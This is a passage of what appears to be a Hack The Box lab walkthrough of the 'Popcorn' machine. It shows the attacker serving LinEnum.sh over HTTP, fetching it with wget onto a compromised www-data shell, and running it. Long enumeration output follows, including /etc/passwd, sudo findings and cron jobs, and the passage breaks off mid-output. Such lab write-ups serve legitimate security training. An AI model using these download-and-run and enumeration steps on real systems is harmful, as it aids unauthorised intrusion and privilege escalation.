class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/桌面/htb-tools]<br>└─$ python3 -m http.server 80<br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br>10.10.10.6 - - [02/Jan/2024 22:28:12] <span class="hljs-string">&quot;GET /LinEnum.sh HTTP/1.0&quot;</span> 200 -<br><br>$ <span class="hljs-built_in">cd</span> /tmp<br>$ <br>$ <span class="hljs-built_in">ls</span> -la<br>total 24<br>drwxrwxrwt  5 root     root     4096 Jan  2 16:06 .<br>drwxr-xr-x 21 root     root     4096 Jan  2 14:48 ..<br>drwxrwxrwt  2 root     root     4096 Jan  2 14:48 .ICE-unix<br>drwxrwxrwt  2 root     root     4096 Jan  2 14:48 .X11-unix<br>prw-r--r--  1 www-data www-data    0 Jan  2 16:30 f<br>-rw-r--r--  1 root     root     1600 Jan  2 14:48 vgauthsvclog.txt.0<br>drwx------  2 root     root     4096 Jan  2 14:48 vmware-root<br>$ wget http://10.10.14.4/LinEnum.sh<br>--2024-01-02 16:30:22--  http://10.10.14.4/LinEnum.sh<br>Connecting to 10.10.14.4:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 46631 (46K) [text/x-sh]<br>Saving to: `LinEnum.sh<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">     0K .......... .......... .......... .......... .....     100% 24.9K=1.8s</span><br><span class="hljs-string"></span><br><span class="hljs-string">2024-01-02 16:30:25 (24.9 KB/s) - `LinEnum.sh&#x27;</span> saved [46631/46631]<br><br>$ <span class="hljs-built_in">ls</span><br>LinEnum.sh<br>f<br>vgauthsvclog.txt.0<br>vmware-root<br>$ <br><br><br>$ <span class="hljs-built_in">chmod</span> +x ./LinEnum.sh<br>$ ./LinEnum.sh<br><br><span class="hljs-comment">#########################################################</span><br><span class="hljs-comment"># Local Linux Enumeration &amp; Privilege Escalation Script #</span><br><span class="hljs-comment">#########################################################</span><br><span class="hljs-comment"># www.rebootuser.com</span><br><span class="hljs-comment"># version 0.982</span><br><br>[-] Debug Info<br>[+] Thorough tests = Disabled<br><br><br>Scan started at:<br>Tue Jan  2 16:31:18 EET 2024                                                             <br>                                                                                         <br><br><span class="hljs-comment">### SYSTEM ##############################################</span><br>[-] Kernel information:<br>Linux popcorn 2.6.31-14-generic-pae <span class="hljs-comment">#48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009 i686 GNU/Linux</span><br><br><br>[-] Kernel information (continued):<br>Linux version 2.6.31-14-generic-pae (buildd@rothera) (gcc version 4.4.1 (Ubuntu 4.4.1-4ubuntu8) ) <span class="hljs-comment">#48-Ubuntu SMP Fri Oct 16 15:22:42 UTC 2009</span><br><br><br>[-] Specific release information:<br>DISTRIB_ID=Ubuntu<br>DISTRIB_RELEASE=9.10<br>DISTRIB_CODENAME=karmic<br>DISTRIB_DESCRIPTION=<span class="hljs-string">&quot;Ubuntu 9.10&quot;</span><br><br><br>[-] Hostname:<br>popcorn<br><br><br><span class="hljs-comment">### USER/GROUP ##########################################</span><br>[-] Current user/group info:<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br><br><br>[-] Users that have previously logged onto the system:<br>Username         Port     From             Latest<br>root             pts/0    10.10.14.23      Tue Nov 21 19:24:41 +0200 2023<br>george           tty1                      Fri May  5 23:12:20 +0300 2017<br><br><br>[-] Who <span class="hljs-keyword">else</span> is logged on:<br> 16:31:18 up  1:43,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT<br><br><br>[-] Group memberships:<br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>uid=1(daemon) gid=1(daemon) <span class="hljs-built_in">groups</span>=1(daemon)<br>uid=2(bin) gid=2(bin) <span class="hljs-built_in">groups</span>=2(bin)<br>uid=3(sys) gid=3(sys) <span class="hljs-built_in">groups</span>=3(sys)<br>uid=4(<span class="hljs-built_in">sync</span>) gid=65534(nogroup) <span class="hljs-built_in">groups</span>=65534(nogroup)<br>uid=5(games) gid=60(games) <span class="hljs-built_in">groups</span>=60(games)<br>uid=6(man) gid=12(man) <span class="hljs-built_in">groups</span>=12(man)<br>uid=7(lp) gid=7(lp) <span class="hljs-built_in">groups</span>=7(lp)<br>uid=8(mail) gid=8(mail) <span class="hljs-built_in">groups</span>=8(mail)<br>uid=9(news) gid=9(news) <span class="hljs-built_in">groups</span>=9(news)<br>uid=10(uucp) gid=10(uucp) <span class="hljs-built_in">groups</span>=10(uucp)<br>uid=13(proxy) gid=13(proxy) <span class="hljs-built_in">groups</span>=13(proxy)<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>uid=34(backup) gid=34(backup) <span class="hljs-built_in">groups</span>=34(backup)<br>uid=38(list) gid=38(list) <span class="hljs-built_in">groups</span>=38(list)<br>uid=39(irc) gid=39(irc) <span class="hljs-built_in">groups</span>=39(irc)<br>uid=41(gnats) gid=41(gnats) <span class="hljs-built_in">groups</span>=41(gnats)<br>uid=65534(nobody) gid=65534(nogroup) <span class="hljs-built_in">groups</span>=65534(nogroup)<br>uid=100(libuuid) gid=101(libuuid) <span class="hljs-built_in">groups</span>=101(libuuid)<br>uid=101(syslog) gid=103(syslog) <span class="hljs-built_in">groups</span>=103(syslog)<br>uid=102(landscape) gid=105(landscape) <span class="hljs-built_in">groups</span>=105(landscape)<br>uid=103(sshd) gid=65534(nogroup) <span class="hljs-built_in">groups</span>=65534(nogroup)<br>uid=1000(george) gid=1000(george) <span class="hljs-built_in">groups</span>=1000(george),4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin)<br>uid=104(mysql) gid=113(mysql) <span class="hljs-built_in">groups</span>=113(mysql)<br><br><br>[-] It looks like we have some admin <span class="hljs-built_in">users</span>:<br>uid=1000(george) gid=1000(george) <span class="hljs-built_in">groups</span>=1000(george),4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin)<br><br><br>[-] Contents of /etc/passwd:<br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/bin/sh<br>bin:x:2:2:bin:/bin:/bin/sh<br>sys:x:3:3:sys:/dev:/bin/sh<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/bin/sh<br>man:x:6:12:man:/var/cache/man:/bin/sh<br>lp:x:7:7:lp:/var/spool/lpd:/bin/sh<br>mail:x:8:8:mail:/var/mail:/bin/sh<br>news:x:9:9:news:/var/spool/news:/bin/sh<br>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh<br>proxy:x:13:13:proxy:/bin:/bin/sh<br>www-data:x:33:33:www-data:/var/www:/bin/sh<br>backup:x:34:34:backup:/var/backups:/bin/sh<br>list:x:38:38:Mailing List Manager:/var/list:/bin/sh<br>irc:x:39:39:ircd:/var/run/ircd:/bin/sh<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh<br>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh<br>libuuid:x:100:101::/var/lib/libuuid:/bin/sh<br>syslog:x:101:103::/home/syslog:/bin/false<br>landscape:x:102:105::/var/lib/landscape:/bin/false<br>sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin<br>george:x:1000:1000:George Papagiannopoulos,,,:/home/george:/bin/bash<br>mysql:x:104:113:MySQL Server,,,:/var/lib/mysql:/bin/false<br><br><br>[-] Super user account(s):<br>root<br><br><br>[+] We can sudo without supplying a password!<br>usage: sudo [-n] -h | -K | -k | -L | -V | -v<br>usage: sudo -l[l] [-AnS] [-g groupname|<span class="hljs-comment">#gid] [-U username] [-u username|#uid]</span><br>            [-g groupname|<span class="hljs-comment">#gid] [command]</span><br>usage: sudo [-AbEHnPS] [-C fd] [-g groupname|<span class="hljs-comment">#gid] [-p prompt] [-u</span><br>            username|<span class="hljs-comment">#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [&lt;command&gt;]</span><br>usage: sudo -e [-AnS] [-C fd] [-g groupname|<span class="hljs-comment">#gid] [-p prompt] [-u</span><br>            username|<span class="hljs-comment">#uid] file ...</span><br><br><br>[+] Possible sudo pwnage!<br>file<br><br><br>[-] Accounts that have recently used sudo:<br>/home/george/.sudo_as_admin_successful<br><br><br>[-] Are permissions on /home directories lax:<br>total 12K<br>drwxr-xr-x  3 root   root   4.0K Mar 17  2017 .<br>drwxr-xr-x 21 root   root   4.0K Jan  2 14:48 ..<br>drwxr-xr-x  3 george george 4.0K Oct 26 14:57 george<br><br><br>[-] Root is allowed to login via SSH:<br>PermitRootLogin <span class="hljs-built_in">yes</span><br><br><br><span class="hljs-comment">### ENVIRONMENTAL #######################################</span><br>[-] Environment information:<br>APACHE_PID_FILE=/var/run/apache2.pid<br>APACHE_RUN_USER=www-data<br>PATH=/usr/local/bin:/usr/bin:/bin<br>PWD=/tmp<br>APACHE_RUN_GROUP=www-data<br>LANG=C<br>SHLVL=1<br>_=/usr/bin/env<br><br><br>[-] Path information:<br>/usr/local/bin:/usr/bin:/bin<br>drwxr-xr-x 2 root root  4096 Mar 17  2017 /bin<br>drwxr-xr-x 2 root root 20480 Oct 26  2020 /usr/bin<br>drwxr-xr-x 2 root root  4096 Mar 17  2017 /usr/local/bin<br><br><br>[-] Available shells:<br><span class="hljs-comment"># /etc/shells: valid login shells</span><br>/bin/csh<br>/bin/sh<br>/usr/bin/es<br>/usr/bin/ksh<br>/bin/ksh<br>/usr/bin/rc<br>/usr/bin/tcsh<br>/bin/tcsh<br>/usr/bin/esh<br>/bin/dash<br>/bin/bash<br>/bin/rbash<br>/usr/bin/screen<br><br><br>[-] Current <span class="hljs-built_in">umask</span> value:<br>u=rwx,g=rx,o=rx<br>0022<br><br><br>[-] Password and storage information:<br>PASS_MAX_DAYS   99999<br>PASS_MIN_DAYS   0<br>PASS_WARN_AGE   7<br>ENCRYPT_METHOD SHA512<br><br><br><span class="hljs-comment">### JOBS/TASKS ##########################################</span><br>[-] Cron <span class="hljs-built_in">jobs</span>:<br>-rw-r--r-- 1 root root  724 Sep 15  2009 /etc/crontab<br><br>/etc/cron.d:<br>total 16<br>drwxr-xr-x  2 root root 4096 Mar 17  2017 .<br>drwxr-xr-x 87 root root 4096 Jan  2 14:48 ..<br>-rw-r--r--  1 root root  102 Sep 15  2009 .placeholder<br>-rw-r--r--  1 root root  506 May  3  2011 php5<br><br>/etc/cron.daily:<br>total 68<br>drwxr-xr-x  2 root root  4096 Mar 17  2017 .<br>drwxr-xr-x 87 root root  4096 Jan  2 14:48 ..<br>-rw-r--r--  1 root root   102 Sep 15  2009 .placeholder<br>-rwxr-xr-x  1 root root   633 Nov 18  2010 apache2<br>-rwxr-xr-x  1 root root   189 Oct 23  2009 apport<br>-rwxr-xr-x  1 root root 16338 Oct 15  2009 apt<br>-rwxr-xr-x  1 root root   314 Sep 28  2009 aptitude<br>-rwxr-xr-x  1 root root   502 May  9  2009 bsdmainutils<br>-rwxr-xr-x  1 root root   256 Sep 20  2009 dpkg<br>-rwxr-xr-x  1 root root    89 Aug 20  2009 logrotate<br>-rwxr-xr-x  1 root root  1270 Sep  7  2009 man-db<br>-rwxr-xr-x  1 root root   665 Apr 29  2009 mlocate<br>-rwxr-xr-x  1 root root  2149 Jun 16  2009 popularity-contest<br>-rwxr-xr-x  1 root root  3349 Sep 15  2009 standard<br><br>/etc/cron.hourly:<br>total 12<br>drwxr-xr-x  2 root root 4096 Mar 17  2017 .<br>drwxr-xr-x 87 root root 4096 Jan  2 14:48 ..<br>-rw-r--r--  1 root root  102 Sep 15  2009 .placeholder<br><br>/etc/cron.monthly:<br>total 16<br>drwxr-xr-x  2 root root 4096 Mar 17  2017 .<br>drwxr-xr-x 87 root root 4096 Jan  2 14:48 ..<br>-rw-r--r--  1 root root  102 Sep 15  2009 .placeholder<br>-rwxr-xr-x  1 root root  129 Sep 15  2009 standard<br><br>/etc/cron.weekly:<br>total 20<br>drwxr-xr-x  2 root root 4096 Oct  1  2020 .<br>drwxr-xr-x 87 root root 4096 Jan  2 14:48 ..<br>-rw-r--r--  1 root root  102 Sep 15  2009 .placeholder<br>-rwxr-xr-x  1 root root 1413 Nov 11  2008 cvs<br>-rwxr-xr-x  1 root root  830 Sep  7  2009 man-db<br><br><br>[-] Crontab contents:<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br><br><br><span class="hljs-comment">### NETWORKING  ##########################################</span><br>[-] Network and IP info:<br>eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:6b:a2  <br>          inet addr:10.10.10.6  Bcast:10.10.11.255  Mask:255.255.254.0<br>          inet6 addr: dead:beef::250:56ff:feb9:6ba2/64 Scope:Global<br>          inet6 addr: fe80::250:56ff:feb9:6ba2/64 Scope:Link<br>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br>          RX packets:1107625 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:385064 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:1000 <br>          RX bytes:78705835 (78.7 MB)  TX bytes:30482777 (30.4 MB)<br><br>lo        Link encap:Local Loopback  <br>          inet addr:127.0.0.1  Mask:255.0.0.0<br>          inet6 addr: ::1/128 Scope:Host<br>          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br>          RX packets:296 errors:0 dropped:0 overruns:0 frame:0<br>          TX packets:296 errors:0 dropped:0 overruns:0 carrier:0<br>          collisions:0 txqueuelen:0 <br>          RX bytes:44770 (44.7 KB)  TX bytes:44770 (44.7 KB)<br><br><br>[-] ARP <span class="hljs-built_in">history</span>:<br>fe80::250:56ff:feb9:d291 dev eth0 lladdr 00:50:56:b9:d2:91 router STALE<br>10.10.10.2 dev eth0 lladdr 00:50:56:b9:d2:91 REACHABLE<br><br><br>[-] Nameserver(s):<br>nameserver 8.8.8.8<br>nameserver 10.10.10.2<br><br><br>[-] Default route:<br>default via 10.10.10.2 dev eth0  metric 100 <br><br><br>[-] Listening TCP:<br>Active Internet connections (only servers)<br>Proto 